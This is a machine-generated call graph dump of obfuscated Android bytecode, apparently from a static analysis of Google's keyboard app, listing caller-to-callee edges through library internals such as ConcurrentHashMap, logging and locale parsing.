SPECIAL edge: specialinvoke $r1.<lpi: void <init>(java.lang.String,int)>("VALUE", 1) in <lpi: void <clinit>()> ==> <lpi: void <init>(java.lang.String,int)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(14) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
CLINIT edge: staticinvoke <iwt: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <iwt: void <clinit>()>
SPECIAL edge: $i1 = specialinvoke r0.<ivv: int h()>() in <ivv: ivw a()> ==> <ivv: int h()>
STATIC edge: $z0 = staticinvoke <ivw: boolean A(char)>($c0) in <ivw: boolean y(char)> ==> <ivw: boolean A(char)>
VIRTUAL edge: $i0 = virtualinvoke $r4.<lma: int size()>() in <lly: lma g()> ==> <lrg: int size()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lvq: int b()>() in <lvq: java.lang.Object c(int)> ==> <lvq: int b()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.k: void <init>(java.lang.Object,java.lang.Object,j$.util.concurrent.ConcurrentHashMap)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r0 = virtualinvoke $r2.<java.lang.Class: java.lang.reflect.Field getDeclaredField(java.lang.String)>("theUnsafe") in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.Class: java.lang.reflect.Field getDeclaredField(java.lang.String)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getValue()>() in <llg: java.lang.Object next()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <ltr: java.lang.Object d(lsz)>
SPECIAL edge: $i2 = specialinvoke r0.<lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])>($r7, $i3, $i2, $r4, $r5) in <lvr: void <init>(lvr,lvr)> ==> <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])>
INTERFACE edge: interfaceinvoke $r10.<java.util.List: boolean add(java.lang.Object)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <her: her k(miy)>($r1) in <her: void <clinit>()> ==> <her: her k(miy)>
VIRTUAL edge: $r0 = virtualinvoke $r1.<java.lang.ThreadLocal: java.lang.Object get()>() in <j$.util.concurrent.ThreadLocalRandom: int a(int)> ==> <java.lang.ThreadLocal: java.lang.Object get()>
SPECIAL edge: specialinvoke $r0.<gwk: void <init>()>() in <gwk: void <clinit>()> ==> <gwk: void <init>()>
STATIC edge: $r1 = staticinvoke <lqq: java.lang.Object u(java.lang.Object[],int,int,int)>($r0, $i2, $i0, $i1) in <lqq: java.lang.Object s(java.lang.Object[],int,int,int)> ==> <lqq: java.lang.Object u(java.lang.Object[],int,int,int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lvt: int hashCode()>
STATIC edge: $r4 = staticinvoke <lqq: lqq r(int,java.lang.Object[],lkt)>($i0, $r1, r0) in <lkt: lkx b(boolean)> ==> <lqq: lqq r(int,java.lang.Object[],lkt)>
SPECIAL edge: specialinvoke $r2.<java.lang.String: void <init>(char[])>($r0) in <iwt: java.lang.String e(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
VIRTUAL edge: $r2 = virtualinvoke r0.<lid: java.lang.Object getValue()>() in <lid: int hashCode()> ==> <lki: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <ivv: void f(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getKey()>() in <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
STATIC edge: $i7 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/notificationcenter/ComponentsReadinessManager") in <iej: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getKey()>() in <lli: void c(java.util.Map$Entry)> ==> <lki: java.lang.Object getKey()>
STATIC edge: staticinvoke <idq: idq a(java.lang.String,mag)>("TenorSearchSuggestionMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
INTERFACE edge: $r9 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getValue()>() in <lmb: lme f()> ==> <lki: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r3.<lsf: void <init>(lsh,java.util.logging.Level)>(r0, $r1) in <lsh: lse h(java.util.logging.Level)> ==> <lsf: void <init>(lsh,java.util.logging.Level)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object[] x()>() in <ljd: void t(int)> ==> <ljd: java.lang.Object[] x()>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lmc: lsa l()>
STATIC edge: staticinvoke <izw: boolean D(java.util.Collection,java.util.Iterator)>($r1, $r0) in <lri: java.util.ArrayList P(java.util.Iterator)> ==> <izw: boolean D(java.util.Collection,java.util.Iterator)>
SPECIAL edge: specialinvoke $r0.<java.lang.Object: void <init>()>() in <ljd: void <clinit>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $c1 = virtualinvoke $r1.<java.lang.String: char charAt(int)>($i2) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: char charAt(int)>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r1, $i5, $i1) in <ljd: int z(int,int,int,int)> ==> <izw: void an(java.lang.Object,int,int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <lma: lma i(int,java.lang.Object[])> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<liz: void b()>() in <liz: java.lang.Object next()> ==> <liz: void b()>
STATIC edge: $r22 = staticinvoke <lwf: java.lang.StackTraceElement[] b(java.lang.Class,int)>(class "Llsn;", $i0) in <lsd: boolean b(lsr)> ==> <lwf: java.lang.StackTraceElement[] b(java.lang.Class,int)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <liy: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r5.<java.lang.AssertionError: void <init>(java.lang.Object)>("Couldn\'t get the Unsafe") in <j$.sun.misc.b: void <clinit>()> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r0.<java.lang.StringBuilder: java.lang.String toString()>() in <izw: java.lang.Object al(int)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)>($r1, $r2, $z0, 1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean)> ==> <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.String: int length()>() in <ivv: ivw a()> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke r0.<lkg: void c(java.lang.Object)>($r1) in <lly: void j(java.lang.Object)> ==> <lkg: void c(java.lang.Object)>
STATIC edge: staticinvoke <ojg: void g(java.lang.Throwable,java.lang.String)>($r0, $r1) in <ojg: void h(java.lang.Throwable)> ==> <ojg: void g(java.lang.Throwable,java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke $r5.<java.text.SimpleDateFormat: java.lang.String format(java.util.Date)>($r3) in <lsc: void f(java.lang.String,ltn)> ==> <java.text.DateFormat: java.lang.String format(java.util.Date)>
SPECIAL edge: specialinvoke r0.<lkq: void <init>()>() in <lqp: void <init>(java.lang.Object[],int,int)> ==> <lkq: void <init>()>
STATIC edge: $r3 = staticinvoke <kes: java.lang.String k(nfe)>($r26) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <kes: java.lang.String k(nfe)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/apps/inputmethod/latin/ImeLatinApp") in <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
STATIC edge: $r0 = staticinvoke <lth: lth i(java.lang.String)>("AndroidIME") in <hef: void <clinit>()> ==> <lth: lth i(java.lang.String)>
STATIC edge: $l0 = staticinvoke <lum: long b()>() in <lsn: void <init>(java.util.logging.Level)> ==> <lum: long b()>
CLINIT edge: staticinvoke <java.util.Locale: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.util.Locale: void <clinit>()>
VIRTUAL edge: $r1 = virtualinvoke $r1.<java.lang.String: java.lang.String concat(java.lang.String)>($r5) in <lvs: lvs a(java.lang.Object)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
INTERFACE edge: $r5 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getValue()>() in <hbv: void j()> ==> <ljb: java.lang.Object getValue()>
VIRTUAL edge: $r6 = virtualinvoke $r7.<lsq: java.lang.String d()>() in <lsc: void f(java.lang.String,ltn)> ==> <lso: java.lang.String d()>
CLINIT edge: staticinvoke <lqc: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqc: void <clinit>()>
VIRTUAL edge: $z2 = virtualinvoke $r1.<java.lang.String: boolean isEmpty()>() in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: boolean isEmpty()>
CLINIT edge: staticinvoke <hbw: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hbw: void <clinit>()>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, 0, 1) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
STATIC edge: $r1 = staticinvoke <izw: java.util.Collection at(java.lang.Iterable)>($r0) in <izw: java.lang.Object[] S(java.lang.Iterable)> ==> <izw: java.util.Collection at(java.lang.Iterable)>
STATIC edge: $i1 = staticinvoke <lma: int e(int)>($i0) in <lqk: void <init>(java.lang.Object[],int)> ==> <lma: int e(int)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>($r0) in <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <iej: void g(java.lang.String,iec)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke r0.<hbv: void j()>() in <hbv: boolean o()> ==> <hbv: void j()>
SPECIAL edge: $r1 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: java.lang.Object[] toArray()> ==> <ljf: java.lang.Object[] s()>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c1) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean u(char)>
STATIC edge: $r2 = staticinvoke <ivw: ivv I()>() in <ivw: ivw d(java.util.Locale)> ==> <ivw: ivv I()>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean B(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: int hashCode()>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/ConcurrentHashMap;", "cellsBusy") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
STATIC edge: $r3 = staticinvoke <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)>($r1, $r2, $i0, 0, $r3) in <lqq: java.lang.Object get(java.lang.Object)> ==> <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)>
STATIC edge: $z1 = staticinvoke <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)>($r2, $r1) in <hbv: void k(java.lang.Object,boolean)> ==> <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r6.<java.lang.String: java.lang.String concat(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lqd: void <init>()>() in <lqc: void <init>()> ==> <lqd: void <init>()>
INTERFACE edge: $r9 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getValue()>() in <lmb: lme f()> ==> <ljb: java.lang.Object getValue()>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: int z(int,int,int,int)> ==> <ljd: int[] w()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.String: int hashCode()>() in <ivw: int hashCode()> ==> <java.lang.String: int hashCode()>
STATIC edge: $z0 = staticinvoke <lma: boolean x(int,int)>($i5, $i1) in <lma: lma i(int,java.lang.Object[])> ==> <lma: boolean x(int,int)>
CLINIT edge: staticinvoke <lql: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lql: void <clinit>()>
STATIC edge: staticinvoke <iwt: void g(char[],int,int)>($r3, $i2, 2) in <ivv: ivw b(java.lang.String)> ==> <iwt: void g(char[],int,int)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Invalid subtag: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
STATIC edge: staticinvoke <nvw: void j(int[],int[],int,int,int)>($r4, $r4, $i0, $i3, $i1) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <nvw: void j(int[],int[],int,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.List: java.util.Iterator iterator()>() in <ivv: java.lang.String c()> ==> <java.util.ArrayList: java.util.Iterator iterator()>
INTERFACE edge: $i0 = interfaceinvoke $r3.<java.util.List: int size()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lql: int size()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljd: boolean v()>() in <ljd: int f(java.lang.Object)> ==> <ljd: boolean v()>
CLINIT edge: staticinvoke <idq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <idq: void <clinit>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r12 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)>($r19) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)>
VIRTUAL edge: virtualinvoke r0.<lli: void e(java.lang.Object,java.lang.Object)>($r2, $r3) in <lli: void c(java.util.Map$Entry)> ==> <lli: void e(java.lang.Object,java.lang.Object)>
INTERFACE edge: $l0 = interfaceinvoke $r2.<ltn: long e()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsn: long e()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<ljf: java.lang.Object e(int)>($i0) in <lje: java.lang.Object next()> ==> <ljf: java.lang.Object e(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>($r1, $i0) in <lpi: void <init>(java.lang.String,int)> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke $r1.<ltc: void <init>(java.lang.String,int,int)>("SMALL", 0, 10) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
VIRTUAL edge: $r3 = virtualinvoke $r1.<lkf: java.lang.Object get(java.lang.Object)>($r2) in <ivw: java.lang.String p()> ==> <lqk: java.lang.Object get(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.lang.IllegalStateException: void <init>(java.lang.String)>("cannot request log site information prior to postProcess()") in <lsn: lsq f()> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r8.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_FULL_IMAGE", 8, 8) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("extlang subtag only occurs when language subtag length is 2 or 3") in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i1) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r4) in <lqc: int compare(java.lang.Object,java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <liy: int size()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r3 = staticinvoke <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)>($r1, $r2, $i0, $i1, $r3) in <lqk: java.lang.Object get(java.lang.Object)> ==> <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
STATIC edge: $r0 = staticinvoke <lum: java.lang.String[] o()>() in <luk: void <clinit>()> ==> <lum: java.lang.String[] o()>
STATIC edge: $r17 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>($z0) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.Object cast(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.util.AbstractMap: void <init>()>() in <lvr: void <init>(lvr,lvr)> ==> <java.util.AbstractMap: void <init>()>
STATIC edge: $z0 = staticinvoke <lri: boolean a(java.util.Comparator,java.lang.Iterable)>($r5, $r4) in <lqs: boolean equals(java.lang.Object)> ==> <lri: boolean a(java.util.Comparator,java.lang.Iterable)>
SPECIAL edge: $r7 = specialinvoke $r2.<lvr: java.util.Map$Entry c(int)>(0) in <lvr: void <init>(lvr,lvr)> ==> <lvr: java.util.Map$Entry c(int)>
SPECIAL edge: specialinvoke $r5.<lsm: void <init>()>() in <lsn: void q(lsz,java.lang.Object)> ==> <lsm: void <init>()>
SPECIAL edge: specialinvoke $r17.<j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>($r19) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/inputmethodentry/InputMethodEntryManager") in <hnt: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lid: int hashCode()>
VIRTUAL edge: virtualinvoke $r19.<java.util.concurrent.atomic.AtomicInteger: int incrementAndGet()>() in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicInteger: int incrementAndGet()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.String: int hashCode()>
VIRTUAL edge: $r4 = virtualinvoke $r4.<java.lang.String: java.lang.String substring(int)>($i0) in <ivw: java.lang.String p()> ==> <java.lang.String: java.lang.String substring(int)>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i1) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lvt: void <init>(lvr)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r4 = virtualinvoke r0.<ljd: java.lang.Object[] x()>() in <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)> ==> <ljd: java.lang.Object[] x()>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: $r1 = staticinvoke <kwe: miy x(java.lang.Object)>(null) in <her: void <clinit>()> ==> <kwe: miy x(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<mii: void <init>()>() in <mij: void <init>(miy)> ==> <mii: void <init>()>
VIRTUAL edge: $i3 = virtualinvoke $r1.<java.lang.String: int length()>() in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke $r3.<java.util.Date: void <init>(long)>($l0) in <lsc: void f(java.lang.String,ltn)> ==> <java.util.Date: void <init>(long)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, $i1, $i4) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
STATIC edge: $r4 = staticinvoke <lma: lma i(int,java.lang.Object[])>($i0, $r1) in <lly: lma g()> ==> <lma: lma i(int,java.lang.Object[])>
SPECIAL edge: $z0 = specialinvoke r0.<hbv: boolean o()>() in <hbv: boolean m(java.lang.Object)> ==> <hbv: boolean o()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(10) in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r7, $i5, $i1) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: void an(java.lang.Object,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <lsp: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" but determined result is ") in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <hef: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hef: void <clinit>()>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.util.Collection: java.lang.Object[] toArray()>() in <lma: lma p(java.util.Collection)> ==> <java.util.AbstractCollection: java.lang.Object[] toArray()>
VIRTUAL edge: $r3 = virtualinvoke $r25.<java.lang.Class: java.lang.String getName()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.Class: java.lang.String getName()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
STATIC edge: $r3 = staticinvoke <j$.sun.misc.b: j$.sun.misc.b h()>() in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: j$.sun.misc.b h()>
CLINIT edge: staticinvoke <java.util.concurrent.TimeUnit: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.util.concurrent.TimeUnit: void <clinit>()>
SPECIAL edge: specialinvoke $r1.<java.util.LinkedHashSet: void <init>(int,float)>($i0, 1.0F) in <ljf: java.util.Set f()> ==> <java.util.LinkedHashSet: void <init>(int,float)>
VIRTUAL edge: $r2 = virtualinvoke $r0.<java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()>() in <ojg: void g(java.lang.Throwable,java.lang.String)> ==> <java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(12) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
CLINIT edge: staticinvoke <lqs: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqs: void <clinit>()>
STATIC edge: staticinvoke <iej: void g(java.lang.String,iec)>("InputMethodEntryManager_GlobalAdditionalImeDefsLoaded", $r5) in <hnt: void <clinit>()> ==> <iej: void g(java.lang.String,iec)>
STATIC edge: $i1 = staticinvoke <izw: int ac(int)>($i1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <izw: int ac(int)>
